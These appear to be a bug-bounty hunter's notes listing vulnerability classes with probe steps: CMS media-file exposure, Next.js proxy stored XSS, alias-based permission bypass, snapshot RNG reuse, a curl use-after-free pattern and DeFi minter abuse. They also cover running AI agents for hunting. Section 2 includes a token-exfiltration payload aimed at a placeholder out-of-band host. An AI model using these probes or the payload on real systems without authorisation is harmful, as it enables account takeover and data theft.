# 2026-11-23 bug-class check-specs

Source posts / reports: mdp_sec Sitecore media-folder listing (15k emails, High), r3dd404 Next.js CDN-proxy ATO (Telegram dailybountywriteup 14996), H1 #3892948 BuddyPress `types` alias, H1 #4059814 Node.js snapshot entropy cache (CVE-2026-106074), H1 #4224454 curl `CURLOPT_RESOLVE` after `curl_easy_reset` (N/A), Blockaid Fusionist BSC bridge-minter exploit, mdp_sec model/provider benchmarks.

## 1. cms_media_library_listing_to_public_file

- **Signal:** CMS/DAM exposes an authenticated listing API for the media library to *any* registered user (Sitecore legacy SOAP `/sitecore/shell/WebService/Service.asmx`, `service2.asmx`, Item Web API / SSC `/sitecore/api/ssc/item/`; AEM `/content/dam.json`/`.infinity.json`; Umbraco media API), while the files themselves are served publicly by path (`/-/media/…`, `/~/media/…`, `/content/dam/…`).
- **Probe:** self-register a low-priv account → list media folders → prioritise folder names `testing|test|temp|tmp|export|backup|old|delete|archive|import` → GET each file **without cookies** with a random `?v=<rand>` to force an origin hit (check `Age`, `X-Cache`, `CF-Cache-Status`).
- **Escalate if:** CSV/XLSX/JSON/ZIP containing PII/credentials; stop at a count + one redacted row.
- **Refs:** [posts/mdp_sec/2026-11-22-2124626476397916632.md](../../posts/mdp_sec/2026-11-22-2124626476397916632.md) (Medium → triaged High).

## 2. same_origin_proxy_to_permissionless_storage (Next.js rewrites)

- **Signal:** `next.config.*` `rewrites()` (or nginx/Vercel/Netlify/Cloudflare rewrites) mapping an app path to a permissionless host: `arweave.net`, `ipfs.io`/any IPFS gateway, `raw.githubusercontent.com`, public S3/GCS buckets, `*.r2.dev`, user-content CDNs.
- **Probe:** request `/<prefix>/<id>` and alternative raw paths (`/raw/<txid>` on Arweave; `?format=raw`/`/ipfs/<cid>` on IPFS) — if HTML renders on the app's origin without a sandbox redirect, you have same-origin stored XSS. Find existing `Content-Type: text/html` objects via Arweave GraphQL (`tags: [{name:"Content-Type", values:["text/html"]}]`) before uploading anything yourself.
- **Escalate if:** CSP allows `'self'` + `'unsafe-inline'`; tokens in `localStorage` (`auth:token`, `refresh_token`, PAT). Exfil via top-level navigation (`window.location='https://oob/?d='+btoa(...)`) — `connect-src` does not restrict navigation.
- **Detection in source review:** grep `rewrites()`/`destination: 'https://` in Next.js configs of open-source targets; flag any destination that accepts anonymous uploads.
- **Refs:** [writeups/telegram-dailybountywriteup/r3dd404-how-a-next-js-cdn-proxy-…](../../writeups/telegram-dailybountywriteup/r3dd404-how-a-next-js-cdn-proxy-turned-into-a-one-click-account-takeover-dd8bc8dd9fde-b9cf7cc7.md) (CVSS 9.3).

## 3. permission_check_on_param_but_write_via_alias

- **Signal:** REST handler permission check inspects param `X`, but the later prepare/serialize step also accepts a legacy alias (`types`→`member_type`, `role`/`roles`, `group`/`groups`, `is_admin`/`admin`, snake/camel variants) and writes it.
- **Probe:** for every privileged field the API refuses (403/400), resend the same value under plural/legacy/camelCase/nested aliases and via `PATCH`/`PUT`/form/JSON; diff the resource after each.
- **Refs:** [hackerone/reports/2026/3892948.md](../../hackerone/reports/2026/3892948.md) (WordPress/BuddyPress 14.5.0, bounty paid).

## 4. snapshot_or_fork_copies_rng_cache

- **Signal:** apps built with V8/Node startup snapshots (`--build-snapshot`, SEA `useSnapshot`), forked pre-warmed workers (pre-fork servers, Lambda SnapStart, Firecracker snapshots) where an RNG/UUID cache was filled before the snapshot.
- **Probe:** start N fresh processes/instances, call the ID/token generator first thing, compare outputs — any repeat = predictable IDs/tokens across instances.
- **Refs:** [hackerone/reports/2026/4059814.md](../../hackerone/reports/2026/4059814.md) (Node.js, CVE-2026-106074: up to 127 UUIDs / ~1,000 `randomInt()` values repeat).

## 5. reset_api_leaves_borrowed_pointer (library UAF pattern)

- **Signal:** option documented as "not copied, keep until transfer completes" + a reset/reuse API documented as "restores defaults". Check whether reset actually clears the borrowed pointer.
- **Probe (ASan harness):** set option → perform → free caller-owned list → reset handle → perform again. Note: curl closed #4224454 as Not-Applicable (API-misuse boundary) — record vendor stance before reporting similar library bugs.
- **Refs:** [hackerone/reports/2026/4224454.md](../../hackerone/reports/2026/4224454.md).

## 6. bridge_minter_privilege (DeFi)

- **Signal:** token contract grants a bridge/minter role to an EOA or a bridge contract whose mint path lacks proof verification / rate limits; mint → sell into DEX liquidity.
- **Checks:** enumerate `MINTER_ROLE`/`minter` holders; confirm mint is gated by a verified cross-chain message (not an off-chain signer alone); per-epoch mint caps; monitoring on `totalSupply` deltas vs locked collateral on the source chain.
- **Refs:** [writeups/telegram-defendor_eng/blockaid-fusionist-bsc-bridge-minter-unbacked-ace-mint.md](../../writeups/telegram-defendor_eng/blockaid-fusionist-bsc-bridge-minter-unbacked-ace-mint.md) (~$1.04M USDT, ongoing at report time; tx/addresses in file).

## 7. agent_model_ops (AI-assisted hunting harness)

- **Provider choice:** same weights through 21 providers solved 10–55% of the same black-box labs; self-host 55% at 236 tok/s, DeepSeek direct 45%. Pin provider + weight hash; canary-eval on every change. [posts/mdp_sec/2026-11-22-2124653323940937754.md](../../posts/mdp_sec/2026-11-22-2124653323940937754.md)
- **No abliterated weights:** 0 refusals on stock; abliterated builds reasoned 16–45% less and timed out 2× more. [posts/mdp_sec/2026-11-23-2124707206306427126.md](../../posts/mdp_sec/2026-11-23-2124707206306427126.md)
- **Latency > parallelism under a wall clock:** 143→236 tok/s per agent took 16→22/40 solves and time-outs 23→9. [posts/mdp_sec/2026-11-22-2124414813296279647.md](../../posts/mdp_sec/2026-11-22-2124414813296279647.md)
- **Scope guard at the network layer:** run agents behind a MITM proxy that drops out-of-scope hosts. [posts/mdp_sec/2026-11-22-2124600258223300633.md](../../posts/mdp_sec/2026-11-22-2124600258223300633.md)
- **Prompt leakage:** third-party routers/resellers harvested canary secrets (Dragos, 2M prompts). Keep secrets out of routed prompts; seed your own canaries. [writeups/S1r1u5_/dragos-ai-supply-chain-canary-tokens.md](../../writeups/S1r1u5_/dragos-ai-supply-chain-canary-tokens.md)
